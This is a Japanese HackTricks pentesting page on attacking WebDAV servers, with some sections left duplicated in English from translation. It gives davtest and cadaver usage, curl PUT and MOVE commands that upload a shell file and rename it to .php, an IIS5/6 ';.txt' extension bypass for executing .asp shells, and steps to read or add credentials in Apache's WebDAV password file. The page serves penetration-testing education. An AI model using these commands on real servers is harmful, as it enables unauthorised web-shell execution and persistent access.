# WebDav

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

アクティブな**WebDavを持つHTTPサーバー**は、おそらくファイルを**更新、削除、移動、コピー**することができるサーバーです。**時には**有効な資格情報**（通常はHTTPベーシック認証で確認）が必要です。

Webサーバーから**いくつかのWebシェルをアップロード**して**実行**し、サーバーを制御しましょう。\
通常、WebDavサーバーに接続するには、有効な**資格情報**が必要です：[**WebDavブルートフォース**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth)（基本認証）。

他の一般的な設定は、Webサーバーによって**実行される**ファイルの**拡張子**で**ファイルのアップロードを禁止**することです。これを**バイパス**する方法を確認する必要があります。

* **実行可能な拡張子**を持つファイルを**アップロード**します（おそらく禁止されていない場合）。
* **実行可能な拡張子**を持たないファイル（.txtなど）を**アップロード**し、ファイルを**実行可能な拡張子**で**名前を変更**（移動）してみてください。
* **実行可能な拡張子**を持たないファイル（.txtなど）を**アップロード**し、ファイルを**実行可能な拡張子**で**コピー**（移動）してみてください。

## DavTest

**Davtest**は、さまざまな拡張子を持つ複数のファイルを**アップロード**し、拡張子が**実行されるかどうか**を**チェック**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
出力サンプル：

![](<../../.gitbook/assets/image (19) (1).png>)

これは、**.txt**および**.html拡張子が実行されている**ことを意味しません。これは、これらのファイルに**Web経由でアクセスできる**ことを意味します。

## Cadaver

このツールを使用して、**WebDavサーバーに接続**し、**アップロード**、**移動**、**削除**などの操作を**手動で**実行できます。
```
cadaver <IP>
```
## PUTリクエスト

A PUT request is an HTTP method used to update or create a resource on a server. It is commonly used in web development and web services. The PUT method allows the client to send data to the server to update an existing resource or create a new one.

PUTリクエストは、サーバー上のリソースを更新または作成するために使用されるHTTPメソッドです。これは、ウェブ開発やウェブサービスでよく使用されます。PUTメソッドを使用すると、クライアントは既存のリソースを更新するためにデータをサーバーに送信したり、新しいリソースを作成したりすることができます。
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE リクエスト

The MOVE request is an HTTP method used in WebDAV (Web Distributed Authoring and Versioning) to move a resource from one location to another. It is similar to the HTTP PUT method, but instead of creating a new resource, it moves an existing resource to a new location.

MOVE リクエストは、WebDAV（Web Distributed Authoring and Versioning）で使用されるHTTPメソッドであり、リソースを1つの場所から別の場所に移動するために使用されます。これはHTTP PUTメソッドと似ていますが、新しいリソースを作成する代わりに、既存のリソースを新しい場所に移動します。

### Syntax

The syntax for the MOVE request is as follows:

MOVE /source-URL HTTP/1.1
Host: example.com
Destination: /destination-URL

### Syntax（構文）

MOVE リクエストの構文は次のようになります：

MOVE /source-URL HTTP/1.1
Host: example.com
Destination: /destination-URL

### Example

Here is an example of a MOVE request:

```
MOVE /file.txt HTTP/1.1
Host: example.com
Destination: /new-folder/file.txt
```

### Example（例）

以下は MOVE リクエストの例です：

```
MOVE /file.txt HTTP/1.1
Host: example.com
Destination: /new-folder/file.txt
```

In this example, the file.txt resource located at the root of the server is moved to the /new-folder/file.txt location.

この例では、サーバーのルートにある file.txt リソースが /new-folder/file.txt の場所に移動されます。
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、自動化することができます。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDavの脆弱性

この脆弱性は非常に興味深いです。**WebDav**は、拡張子**.asp**のファイルを**アップロード**または**名前を変更**することを**許可しません**。しかし、名前の末尾に**";.txt"**を追加することで、この制限を**バイパス**することができ、ファイルは.aspファイルとして**実行**されます（".txt"の代わりに".html"を使用することもできますが、**";"を忘れないでください**）。

その後、シェルを".**txtファイル**"としてアップロードし、それを".asp;.txtファイル"に**コピー/移動**します。Webサーバーを介してそのファイルにアクセスすると、それが**実行**されます（cadaverは移動アクションが機能しなかったと言いますが、実際には機能しています）。

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## 認証情報の投稿

WebdavがApacheサーバーを使用している場合は、Apacheで構成されたサイトを確認する必要があります。一般的には：\
_**/etc/apache2/sites-enabled/000-default**_

その中には、次のようなものが見つかるかもしれません：
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
以下に、**WebDAV**サーバーの有効な**資格情報**を持つファイルがあることがわかります:
```
/etc/apache2/users.password
```
この種のファイルの中には、**ユーザー名**とパスワードの**ハッシュ**が含まれています。これらは、WebDAVサーバーがユーザーを認証するために使用している資格情報です。

これらを**クラック**するか、何らかの理由で**WebDAV**サーバーに**アクセス**したい場合には、追加することもできます。
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているかどうかを確認するには、次の操作を行うことができます：
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
